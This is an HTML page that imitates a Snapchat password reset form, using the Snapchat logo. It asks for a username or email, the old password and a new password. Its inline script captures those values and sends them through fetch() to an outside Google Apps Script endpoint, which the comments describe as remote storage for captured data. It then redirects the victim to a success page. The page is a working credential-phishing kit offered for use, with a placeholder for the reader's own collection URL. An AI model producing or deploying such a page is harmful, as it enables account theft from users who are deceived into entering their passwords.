<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Snapchat Password Reset</title>
    <link rel="stylesheet" href="index.css"> <!-- Link to your CSS file -->
</head>
<body>
    <div class="form">
        <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" alt="Snapchat Logo" class="snapchat-logo">
        <h1>Reset Your Snapchat Password</h1>
        <form id="passwordForm">
            <label for="username">Username or Email Address:</label><br>
            <input type="text" id="username" name="username" placeholder="Enter your username or email" required><br><br>
            
            <label for="old_password">Old Password:</label><br>
            <input type="password" id="old_password" name="old_password" placeholder="Enter your old password" required><br><br>
            
            <label for="new_password">New Password:</label><br>
            <input type="password" id="new_password" name="new_password" placeholder="Enter your new password" required><br><br>
            
            <input type="submit" value="Submit">
        </form>
    </div>
    
    <script>
        document.getElementById('passwordForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form submission
            
            var username = document.getElementById('username').value;
            var oldPassword = document.getElementById('old_password').value;
            var newPassword = document.getElementById('new_password').value;
            
            // Send captured data to remote storage (Google Apps Script endpoint)
            storePassword(username, oldPassword, newPassword);
        });
        
        function storePassword(username, oldPassword, newPassword) {
            var url = "https://script.google.com/macros/s/AKfycbzbGdeHf2DcVr15XfeyRvSsIu7w1H5WdHx2kZzW7A/exec"; // Update with your deployed Google Apps Script URL
            
            var data = {
                "username": username,
                "old_password": oldPassword,
                "new_password": newPassword
            };
            
            var queryString = Object.keys(data).map(key => key + '=' + encodeURIComponent(data[key])).join('&');
            
            var finalUrl = url + '?' + queryString;
            
            // Send data using fetch API
            fetch(finalUrl)
                .then(response => {
                    if (response.ok) {
                        console.log("Password submitted successfully");
                        // Optional: Redirect to a message page
                        window.location.href = "success.html";
                    } else {
                        console.error("Error submitting password");
                        // Handle error (optional)
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    // Handle network error (optional)
                });
        }
    </script>
</body>
</html>
